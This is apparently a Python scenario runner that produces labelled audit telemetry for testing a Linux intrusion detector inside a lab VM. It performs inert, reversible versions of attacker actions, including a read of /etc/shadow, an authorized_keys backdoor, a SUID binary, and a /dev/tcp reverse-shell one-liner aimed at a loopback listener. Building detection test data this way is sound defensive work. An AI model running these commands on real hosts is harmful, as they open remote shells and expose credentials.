#!/usr/bin/env python3
"""Generate labelled benign and malicious audit telemetry inside the LinuxGuard lab VM.

This produces the Phase 9 test data for evaluating the detector. Every action is inert,
reversible and confined to the VM on loopback; each scenario has a cleanup and a
clean-verify step and is undone before the next. Labels come from the catalogue below,
never from detector output. Run only as root on host ``linuxguard-target``:

    sudo python3 run.py --list                 # catalogue only, no root, no changes
    sudo python3 run.py --repeats 1            # one development pass
    sudo python3 run.py --repeats 10 --seed 7  # evaluation data (after rules are frozen)

Deferred: scenarios that need repeated failed authentication (rules R04/R05) are not
generated here, because this VM has no user-creation tool (useradd/adduser) and no
sshpass to drive password prompts headlessly. R04/R05 are covered by unit tests on
synthetic USER_AUTH records and by the real mistyped logins already in the setup capture.
"""

import argparse
import csv
from dataclasses import dataclass, field
from datetime import datetime, timezone
import json
import os
from pathlib import Path
import random
import secrets
import shutil
import socket
import subprocess
import time
from typing import Callable

HOSTNAME = "linuxguard-target"
WORK_ROOT = Path("/home/bonzo/linuxguard-scenarios")
SVC_UID = 33  # www-data, an unprivileged service account present on this VM


def utc_now() -> str:
    return datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")


def sh(*argv, check=True, **kwargs):
    return subprocess.run(argv, check=check, capture_output=True, text=True, timeout=60, **kwargs)


def as_service(*argv):
    """Run argv as the www-data service account (uid 33), with its groups cleared."""
    return sh("setpriv", "--reuid", str(SVC_UID), "--regid", str(SVC_UID), "--clear-groups", *argv, check=False)


@dataclass
class Ctx:
    work: Path
    run_id: str


@dataclass
class Scenario:
    id: str
    label: str            # 'benign' or 'malicious' — authored here, never from a detector
    category: str
    expect: str           # documentation only: the rule we expect; not used for labelling
    run: Callable[[Ctx], None]
    cleanup: Callable[[Ctx], None] = lambda ctx: None
    verify_clean: Callable[[Ctx], bool] = lambda ctx: True


# ---- shared inert building blocks -------------------------------------------------

def _drop(path: Path, body: str):
    path.write_text(body, encoding="utf-8")


def _gone(path: Path) -> bool:
    return not path.exists()


def _restore_guard(target: Path, ctx: Ctx):
    """Back up a system file so a write scenario is always reversible and verifiable."""
    backup = ctx.work / (target.name + ".orig")
    shutil.copy2(target, backup)
    return backup


# ---- malicious scenarios (inert, reversible, loopback-only) -----------------------

def mal_sudoers(ctx):  # R03
    _drop(Path("/etc/sudoers.d/lg-scenario"), "# LinuxGuard scenario marker, no sudo grant\n")

def mal_sudoers_clean(ctx):
    Path("/etc/sudoers.d/lg-scenario").unlink(missing_ok=True)


def mal_cron(ctx):  # R08
    _drop(Path("/etc/cron.d/lg-scenario"), "# LinuxGuard scenario marker, no job\n")

def mal_cron_clean(ctx):
    Path("/etc/cron.d/lg-scenario").unlink(missing_ok=True)


def mal_suid(ctx):  # R10
    binary = ctx.work / "suidmarker"
    shutil.copy2("/bin/true", binary)
    sh("chmod", "u+s", str(binary))

def mal_suid_clean(ctx):
    (ctx.work / "suidmarker").unlink(missing_ok=True)


def mal_tmp_exec(ctx):  # R07
    script = Path("/dev/shm/lg-scenario.sh")
    _drop(script, "#!/bin/sh\necho linuxguard-scenario >/dev/null\n")
    sh("chmod", "0755", str(script))
    sh("/bin/sh", str(script))

def mal_tmp_exec_clean(ctx):
    Path("/dev/shm/lg-scenario.sh").unlink(missing_ok=True)


def mal_authkeys(ctx):  # R09
    keyfile = ctx.work / "throwaway"
    sh("ssh-keygen", "-q", "-t", "ed25519", "-N", "", "-C", "lg-scenario-throwaway", "-f", str(keyfile))
    pub = (keyfile.with_suffix(".pub")).read_text().strip()
    target = Path("/home/bonzo/.ssh/authorized_keys")
    ctx._authkeys_existed = target.exists()
    ctx._authkeys_backup = _restore_guard(target, ctx) if target.exists() else None
    with target.open("a", encoding="utf-8") as stream:
        stream.write(pub + " lg-scenario\n")

def mal_authkeys_clean(ctx):
    target = Path("/home/bonzo/.ssh/authorized_keys")
    if getattr(ctx, "_authkeys_existed", False):
        shutil.copy2(ctx._authkeys_backup, target)   # exact byte restore
    else:
        target.unlink(missing_ok=True)

def mal_authkeys_verify(ctx):
    target = Path("/home/bonzo/.ssh/authorized_keys")
    return "lg-scenario" not in (target.read_text() if target.exists() else "")


def mal_shadow_read(ctx):  # R01 — a non-auth binary reads the hash file
    with open("/dev/null", "wb") as sink:
        sh("cat", "/etc/shadow", stdout=sink)


def mal_identity_write(ctx):  # R02 — reversible no-op rewrite via a non-account tool
    target = Path("/etc/passwd")
    backup = _restore_guard(target, ctx)
    before = sh("sha256sum", str(target)).stdout.split()[0]
    sh("sed", "-i", "s/\\r$//", str(target))  # rewrites the file; content unchanged
    after = sh("sha256sum", str(target)).stdout.split()[0]
    if before != after:
        shutil.copy2(backup, target)
        raise RuntimeError("identity scenario changed /etc/passwd; restored from backup")

def mal_identity_verify(ctx):
    backup = ctx.work / "passwd.orig"
    return sh("sha256sum", "/etc/passwd").stdout.split()[0] == sh("sha256sum", str(backup)).stdout.split()[0]


def mal_service_shell(ctx):  # R06 — interactive shell as the service account
    as_service("/bin/bash", "-c", ":")


def mal_reverse_shell(ctx):  # R06 — service account connects a shell to a loopback listener
    port = 1 + secrets.randbelow(20000) + 20000
    listener = subprocess.Popen(["nc", "-l", "-p", str(port), "127.0.0.1"],
                                stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(0.5)
    try:
        as_service("/bin/bash", "-c",
                   f"exec 3<>/dev/tcp/127.0.0.1/{port}; /bin/bash -i >&3 2>&3 <&3 & sleep 1; kill %1 2>/dev/null")
    finally:
        time.sleep(1.5)
        listener.terminate()
        try:
            listener.wait(timeout=5)
        except subprocess.TimeoutExpired:
            listener.kill()


# ---- not-expected-to-fire (left for Phase 7 ML), and benign look-alikes -----------

def ml_enumerate(ctx):  # broad filesystem walk; rules are not designed to catch this
    sh("find", "/usr", "-xdev", "-type", "f", check=False)

def ml_binary_burst(ctx):  # many distinct binaries in a short burst
    for name in ("ls", "cat", "echo", "head", "tail", "wc", "sort", "uniq", "cut", "tr",
                 "date", "basename", "dirname", "env", "id", "whoami", "uname", "seq", "md5sum", "nl"):
        sh(name, "--help", check=False)


def ben_chmod(ctx):  # legitimate chmod, no SUID — near-miss for R10
    f = ctx.work / "doc.txt"; _drop(f, "notes\n"); sh("chmod", "0644", str(f))

def ben_known_hosts(ctx):  # .ssh write that is not authorized_keys — near-miss for R09
    target = Path("/home/bonzo/.ssh/known_hosts")
    ctx._kh_existed = target.exists()
    ctx._kh_backup = _restore_guard(target, ctx) if target.exists() else None
    with target.open("a", encoding="utf-8") as stream:
        stream.write("# lg-scenario benign marker\n")

def ben_known_hosts_clean(ctx):
    target = Path("/home/bonzo/.ssh/known_hosts")
    if getattr(ctx, "_kh_existed", False):
        shutil.copy2(ctx._kh_backup, target)
    else:
        target.unlink(missing_ok=True)

def ben_user_shell(ctx):  # shell as a normal user (uid 1000) — near-miss for R06
    sh("setpriv", "--reuid", "1000", "--regid", "1000", "--clear-groups", "/bin/bash", "-c", ":", check=False)

def ben_exec_usrbin(ctx):  # execution from a normal location — near-miss for R07
    sh("/usr/bin/ls", str(ctx.work))

def ben_passwd_read(ctx):  # reading identity files is normal and not a write
    with open("/dev/null", "wb") as sink:
        sh("cat", "/etc/passwd", stdout=sink)

def ben_tar(ctx):  # archive a directory, a common admin task
    _drop(ctx.work / "a.txt", "a\n"); _drop(ctx.work / "b.txt", "b\n")
    sh("tar", "-czf", str(ctx.work / "bundle.tgz"), "-C", str(ctx.work), "a.txt", "b.txt")

def ben_find(ctx):  # a scoped search a developer runs
    sh("find", str(ctx.work), "-maxdepth", "2", "-type", "f", check=False)

def ben_cp(ctx):  # copy a file within the work area
    src = ctx.work / "src.txt"; _drop(src, "payloadless\n"); sh("cp", str(src), str(ctx.work / "dst.txt"))

def ben_sudoers_list(ctx):  # reading sudoers config is legitimate — near-miss for R03
    sh("ls", "-la", "/etc/sudoers.d", check=False)

def ben_systemd_list(ctx):  # listing units is legitimate — near-miss for R08
    sh("ls", "-la", "/etc/systemd/system", check=False)


def build_catalogue() -> list[Scenario]:
    return [
        Scenario("MAL-SUDOERS", "malicious", "privilege-escalation", "R03", mal_sudoers, mal_sudoers_clean,
                 lambda c: _gone(Path("/etc/sudoers.d/lg-scenario"))),
        Scenario("MAL-CRON", "malicious", "persistence", "R08", mal_cron, mal_cron_clean,
                 lambda c: _gone(Path("/etc/cron.d/lg-scenario"))),
        Scenario("MAL-SUID", "malicious", "privilege-escalation", "R10", mal_suid, mal_suid_clean,
                 lambda c: _gone(c.work / "suidmarker")),
        Scenario("MAL-TMPEXEC", "malicious", "execution", "R07", mal_tmp_exec, mal_tmp_exec_clean,
                 lambda c: _gone(Path("/dev/shm/lg-scenario.sh"))),
        Scenario("MAL-AUTHKEYS", "malicious", "persistence", "R09", mal_authkeys, mal_authkeys_clean, mal_authkeys_verify),
        Scenario("MAL-SHADOW", "malicious", "credential-access", "R01", mal_shadow_read),
        Scenario("MAL-IDENTITY", "malicious", "credential-access", "R02", mal_identity_write, lambda c: None, mal_identity_verify),
        Scenario("MAL-SVCSHELL", "malicious", "execution", "R06", mal_service_shell),
        Scenario("MAL-REVSHELL", "malicious", "execution", "R06", mal_reverse_shell),
        Scenario("ML-ENUM", "malicious", "discovery", "none (ML)", ml_enumerate),
        Scenario("ML-BINBURST", "malicious", "execution", "none (ML)", ml_binary_burst),
        Scenario("BEN-CHMOD", "benign", "file-permissions", "none", ben_chmod),
        Scenario("BEN-KNOWNHOSTS", "benign", "ssh", "none", ben_known_hosts, ben_known_hosts_clean,
                 lambda c: "lg-scenario" not in (Path("/home/bonzo/.ssh/known_hosts").read_text()
                                                 if Path("/home/bonzo/.ssh/known_hosts").exists() else "")),
        Scenario("BEN-USERSHELL", "benign", "execution", "none", ben_user_shell),
        Scenario("BEN-EXEC", "benign", "execution", "none", ben_exec_usrbin),
        Scenario("BEN-PASSWDREAD", "benign", "file-read", "none", ben_passwd_read),
        Scenario("BEN-TAR", "benign", "file-management", "none", ben_tar),
        Scenario("BEN-FIND", "benign", "discovery", "none", ben_find),
        Scenario("BEN-CP", "benign", "file-management", "none", ben_cp),
        Scenario("BEN-SUDOERSLIST", "benign", "file-read", "none", ben_sudoers_list),
        Scenario("BEN-SYSTEMDLIST", "benign", "file-read", "none", ben_systemd_list),
    ]


def _auditctl_status():
    result = sh("auditctl", "-s", check=False)
    return result.stdout


def _preflight():
    if os.geteuid() != 0:
        raise SystemExit("run scenarios as root on the VM (sudo python3 run.py ...)")
    if socket.gethostname() != HOSTNAME:
        raise SystemExit(f"refusing to run anywhere but {HOSTNAME}")
    if sh("systemctl", "is-active", "auditd", check=False).stdout.strip() != "active":
        raise SystemExit("auditd is not active")
    status = _auditctl_status()
    fields = dict(line.split(None, 1) for line in status.splitlines() if " " in line)
    if fields.get("enabled", "").strip() != "1" or fields.get("lost", "").strip() != "0":
        raise SystemExit(f"audit status not healthy (need enabled 1, lost 0):\n{status}")
    for tool in ("setpriv", "nc", "ssh-keygen", "find", "chmod"):
        if shutil.which(tool) is None:
            raise SystemExit(f"required tool missing: {tool}")
    return status


def execute(repeats, seed, gap, only):
    status_before = _preflight()
    run_id = utc_now().replace(":", "").replace("-", "")[:15] + "-" + secrets.token_hex(3)
    work = WORK_ROOT / run_id
    work.mkdir(parents=True)
    shutil.chown(work, user="bonzo")
    scenarios = [s for s in build_catalogue() if not only or s.id in only]
    rng = random.Random(seed)
    rows = []
    try:
        for repetition in range(1, repeats + 1):
            order = scenarios[:]
            rng.shuffle(order)
            for scenario in order:
                ctx = Ctx(work=work, run_id=run_id)
                start = utc_now()
                error = None
                try:
                    scenario.run(ctx)
                finally:
                    scenario.cleanup(ctx)
                    if not scenario.verify_clean(ctx):
                        error = "cleanup verification failed"
                rows.append({"scenario_id": scenario.id, "run_id": run_id, "repetition": repetition,
                             "label": scenario.label, "category": scenario.category,
                             "start_ts": start, "end_ts": utc_now()})
                if error:
                    raise SystemExit(f"{scenario.id}: {error}; aborting after teardown")
                time.sleep(gap)
    finally:
        labels = work / "labels.csv"
        with labels.open("w", newline="") as stream:
            writer = csv.DictWriter(stream, fieldnames=["scenario_id", "run_id", "repetition",
                                                        "label", "category", "start_ts", "end_ts"])
            writer.writeheader()
            writer.writerows(rows)
        (work / "run.json").write_text(json.dumps(
            {"run_id": run_id, "host": socket.gethostname(), "seed": seed, "repeats": repeats,
             "scenarios": [s.id for s in scenarios], "rows": len(rows),
             "auditctl_before": status_before, "auditctl_after": _auditctl_status(),
             "note": "Scripted, inert, reversible lab scenarios. Labels authored from the "
                     "catalogue, independent of any detector."}, indent=2) + "\n", encoding="utf-8")
        shutil.chown(labels, user="bonzo")
    print(json.dumps({"run_id": run_id, "work": str(work), "rows": len(rows)}))


def main(argv=None):
    parser = argparse.ArgumentParser(description="LinuxGuard labelled scenario runner (Phase 9)")
    parser.add_argument("--list", action="store_true", help="Print the catalogue and exit; no root, no changes")
    parser.add_argument("--repeats", type=int, default=1, help="Repetitions per scenario (1-20)")
    parser.add_argument("--seed", type=int, default=42)
    parser.add_argument("--gap", type=float, default=20.0, help="Seconds between scenarios")
    parser.add_argument("--only", nargs="*", help="Restrict to these scenario ids")
    args = parser.parse_args(argv)
    catalogue = build_catalogue()
    if args.list:
        for scenario in catalogue:
            print(f"{scenario.id:16} {scenario.label:9} {scenario.category:20} expect={scenario.expect}")
        return 0
    if not 1 <= args.repeats <= 20:
        parser.error("--repeats must be between 1 and 20")
    execute(args.repeats, args.seed, args.gap, set(args.only or []))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
